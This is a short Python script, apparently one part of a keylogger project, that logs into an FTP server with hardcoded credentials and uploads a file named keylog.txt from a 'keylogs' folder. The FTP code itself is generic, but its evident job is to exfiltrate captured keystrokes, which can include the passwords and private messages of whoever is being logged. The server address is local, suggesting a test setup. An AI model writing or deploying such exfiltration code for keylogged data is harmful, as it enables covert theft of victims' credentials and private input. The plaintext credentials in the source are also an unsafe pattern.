
import ftplib
import os

def upload_file_to_ftp(host, username, password, local_filepath):
    try:
        with ftplib.FTP(host) as ftp:
            ftp.login(username, password)
            print(ftp.getwelcome())

            with open(local_filepath, 'rb') as file:
                remote_name = os.path.basename(local_filepath)
                ftp.storbinary(f"STOR {remote_name}", file)

            print(f"Uploaded as {remote_name}")

    except ftplib.all_errors as e:
        print(f"FTP error: {e}")

if __name__ == '__main__':
    upload_file_to_ftp(
        "127.0.0.1",
        "yashbanait",
        "yash@6123",
        r"C:\keylogs\keylog.txt"
    )